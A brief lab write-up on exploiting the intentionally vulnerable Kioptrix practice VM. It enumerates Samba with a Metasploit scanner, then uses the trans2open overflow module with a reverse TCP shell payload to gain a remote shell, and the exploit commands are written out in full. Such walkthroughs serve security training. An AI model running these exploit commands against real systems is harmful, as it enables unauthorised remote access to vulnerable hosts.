# Kioptrix - Gaining a remote shell with Metasploit

**OWASP Category: A03:2025 Software Supply Chain Failures** 

Enumerating Kioptrix VM, we find an old Samba version running that is vulnerable to exploits. Utilizing a Metasploit payload we gain a remote shell on Kioptrix.

## Tools:
- **Bash terminal**
- **Metasploit**
- **Kioptrix VM from VulnHub**

## Methodology:

1. **Setting up our environment**
    - We are running Kioptrix VM on 192.168.1.6

2. **Enumerating SMB**
    - Enumerating SMB on Kioptrix using Metasploit auxiliary.

    ```bash
    msfconsole
    use auxiliary/scanner/smb/smb_version
    set RHOST 192.168.1.6
    run
    ```

    <img src="\assets\Kioptrix_enumeration.png" alt="smb_enumeration" width="1000px">

    -We found that there is Samba 2.2 running. After quick research, I found a described vulnerability Samba trans2open Overflow (Source: https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)


3. **Exploiting the Samba vulnerability to gain shell**
    - I utilized the exploit/linux/samba/trans2open Metasploit exploit do gain a shell on Kioptrix.
    
    ```bash
    use exploit/linux/samba/trans2open
    set RHOST 192.168.1.6
    set payload linux/x86/shell_reverse_tcp
    run
    ```

    - After running the exploit we had successfully gained a shell on Kioptrix:

    <img src="\assets\Kioptrix_gained_shell.png" alt="gained_shell" width="1000px">
